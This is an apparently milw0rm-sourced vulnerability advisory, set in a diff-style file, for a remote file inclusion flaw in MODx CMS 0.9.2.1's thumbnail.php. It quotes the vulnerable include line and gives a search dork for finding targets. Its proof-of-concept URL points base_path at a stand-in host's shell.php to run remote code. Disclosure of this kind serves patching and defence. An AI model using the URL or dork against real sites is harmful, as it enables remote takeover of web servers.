@@ -1,0 +1,26 @@
++-------------------------------------------------------------------------------------------
++ MODx CMS 0.9.2.1 (base_path) Remote File Include Vulnerability
++-------------------------------------------------------------------------------------------
++ Affected Software .: MODx CMS 0.9.2.1
++ Vendor ............: http://modxcms.com/
++ Download ..........: http://modxcms.com/downloads.html
++ Description .......: "MODx is an open source PHP Application Framework that helps you take control of your online content."
++ Dork ..............: "powered by MODx"
++ Class .............: Remote File Inclusion
++ Risk ..............: High (Remote File Execution)
++ Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>
++-------------------------------------------------------------------------------------------
++ Details:
++ MODx CMS manager/media/browser/mcpuk/connectors/php/commands/thumbnail.php does not initialize
++ the $base_path variable before using it to include files, assuming register_globals = on,
++ we can intialize the variable in a query string and include a remote file of our choice.
++ 
++ Vulnerable Code:
++ manager/media/browser/mcpuk/connectors/php/commands/thumbnail.php, line(s) 24:
++ -> include $base_path."manager/media/browser/mcpuk/connectors/php/Commands/helpers/iconlookup.php";
++
++ Proof Of Concept:
++ http://[target]/[path]/manager/media/browser/mcpuk/connectors/php/Commands/Thumbnail.php?base_path=http://evilsite.com/shell.php?
++-------------------------------------------------------------------------------------------
+
+# milw0rm.com [2006-11-03]
